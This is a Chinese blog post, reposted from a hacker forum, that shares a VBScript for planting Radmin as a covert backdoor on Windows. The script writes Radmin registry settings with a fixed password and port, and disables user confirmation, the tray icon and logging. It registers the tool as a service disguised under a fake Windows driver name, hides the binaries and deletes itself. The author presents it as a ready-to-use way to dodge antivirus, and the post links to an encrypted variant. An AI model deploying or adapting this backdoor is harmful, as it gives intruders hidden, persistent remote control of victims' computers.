---
title: Vbs脚本实现radmin终极后门
description: 作者：孤狐浪子来源：红狼在网上看到N多人做radmin 后门，要导出注册表而且还用被杀软件K杀。所以本人把自己写的脚本提供大家分享。比较实用，希望大家喜欢。onerrorresumenextconstHKEY_LOCAL_MACHINE=&H80000002strComputer="."...........................................................................
date: 2008-02-25 10:00:29
category: 技术文章
tags: ['脚本Script', '后门']
post_id: 382
alias: VBS-radmin-backdoor
ViewNums: 4921
---

作者：孤狐浪子
来源：红狼

在网上看到N多人做 [radmin](/blog/radmin-31-server-crack-nosetup) [后门](/tags/%E5%90%8E%E9%97%A8)，要导出注册表而且还用被杀[软件](/tags/%E8%BD%AF%E4%BB%B6)K杀。所以本人把自己写的[脚本](/tags/%E8%84%9A%E6%9C%ACScript)提供大家分享。比较实用，希望大家喜欢。

on error resume next
const HKEY_LOCAL_MACHINE = &H80000002
strComputer = "."
Set StdOut = WScript.StdOut
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\" &_
strComputer & "
ootdefault:StdRegProv")
strKeyPath = "SYSTEMRAdmin"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEMRAdminv2.0"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEMRAdminv2.0Server"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEMRAdminv2.0Serveriplist"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEMRAdminv2.0ServerParameters"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
Set objRegistry = GetObject("Winmgmts:rootdefault:StdRegProv")
strPath = "SYSTEMRAdminv2.0ServerParameters"
uBinary = Array(0,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"AskUser",uBinary)
uBinary = Array(0,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"AutoAllow",uBinary)
uBinary = Array(1,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"DisableTrayIcon",uBinary)
uBinary = Array(0,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"EnableEventLog",uBinary)
uBinary = Array(0,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"EnableLogFile",uBinary)
uBinary = Array(0,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"FilterIp",uBinary)
uBinary = Array(0,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"NTAuthEnabled",uBinary)
uBinary = Array(198,195,162,215,37,223,10,224,99,83,126,32,212,173,208,119) //此为注册表导出十六进制转为十进制数据 pass:241241241
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"Parameter",uBinary) //Radmin密码
uBinary = Array(5,4,0,0) //端口：1029
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"Port",uBinary)
uBinary = Array(10,0,0,0)
Return = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE,strPath,"Timeout",uBinary)
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\" &strComputer &"
ootdefault:StdRegProv")
strKeyPath = "SYSTEMRAdminv2.0ServerParameters"
strValueName = "LogFilePath"
strValue = "c:logfile.txt"
set wshshell=createobject ("wscript.shell")
a=wshshell.run ("sc.exe create WinManageHelp binpath= %systemroot%system32Exporer.exe start= auto",0)
oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\" &strComputer &"
ootdefault:StdRegProv")
strKeyPath = "SYSTEMControlSet001ServicesWinManageHelp"
strValueName = "Description"
strValue = "Windows Media PlayerWindows Management Instrumentation Player Drivers."
oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue
strValueName = "DisplayName"
strValue = "Windows Management Instrumentation Player Drivers"
oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue
strValueName = "ImagePath"
strValue = "c:windowssystem32Exporer.exe /service"
oReg.SetExpandedStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue
set wshshell=createobject ("wscript.shell")
a=wshshell.run ("net start WinManageHelp",0)
b=wshshell.run ("attrib +r +h +s %systemroot%system32exporer.exe",0)
c=wshshell.run ("attrib +r +h +s %systemroot%system32AdmDll.dll",0)
d=wshshell.run ("attrib +r +h +s %systemroot%system32
addrv.dll",0)
CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName) //自删除

附件：
[RAdmin.rar](http://201314.free.fr/attachments/200801/RAdmin.rar "http://201314.free.fr/attachments/200801/RAdmin.rar") (1014 Bytes)
[Radmin VBS加密版.rar](http://201314.free.fr/attachments/200801/Radmin%20VBS%EF%BF%BD%EF%BF%BD%EF%BF%BD%DC%B0%EF%BF%BD.rar "http://201314.free.fr/attachments/200801/Radmin%20VBS%BC%D3%C3%DC%B0%E6.rar") (1.4 KB)

